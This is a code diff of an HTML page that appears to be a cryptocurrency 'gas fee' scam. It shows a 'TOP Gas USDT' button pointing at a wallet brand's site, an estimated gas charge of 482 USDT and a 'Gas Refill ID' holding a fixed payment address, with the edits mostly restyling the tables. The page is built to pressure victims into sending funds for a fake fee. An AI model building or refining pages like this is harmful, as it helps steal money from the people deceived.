@@ -53,13 +53,13 @@
 
  <hr>
            
-                                                  <!-- XtN Details -->
-                                                         
+     <!-- XtN Details -->
+     
 <img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="100" />
 
 <!-- get gas -->
 
-<form action="https://phantom.com/" method="get">
+<form action="https://www.exodus.com" method="get">
 <button align="center" type="submit">[TOP Gas ⛽️ USDT]</button>
 </form>  
 
@@ -67,7 +67,7 @@
 
 <br>
   
-<table>
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#05a5f0; background-color:#05a5f0; border-radius:6px; margin:20px 0;">
     <tr>
         <td style="color: Black; font-weight: bold; font-style: italic;">Gas (estimated): [$482] = 482 USDT</td>
     </tr>
@@ -85,13 +85,13 @@
 <hr>
 
 <h4>Payment Method<h4>
-<table style="width: 100%; max-width: 400px; margin: 20px auto; border-collapse: collapse; border: 1px solid #ccc; border-radius: 5px; overflow: hidden;">
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#05a5f0; background-color:#05a5f0; border-radius:6px; margin:20px 0;">
     <tr>
-        <th colspan="2" style="padding: 15px; text-align: center; background-color: #f2f2f2;">TOP GAS⛽️ | USDT Network</th>
+        <th colspan="2" style="padding: 10px; text-align: center; background-color: #f2f2f2;">TOP GAS⛽️ | USDT Network</th>
     </tr>
     <tr>
-        <td style="padding: 15px; text-align: center;">⛽️ Gas Refill ID</td>
-        <td id="gasAddress" style="padding: 15px; text-align: center;">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</td>
+        <td style="padding: 10px; text-align: center;">⛽️ Gas Refill ID</td>
+        <td id="gasAddress" style="padding: 10px; text-align: center;">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</td>
     </tr>
     <tr>
         <td colspan="2" style="text-align: center;">
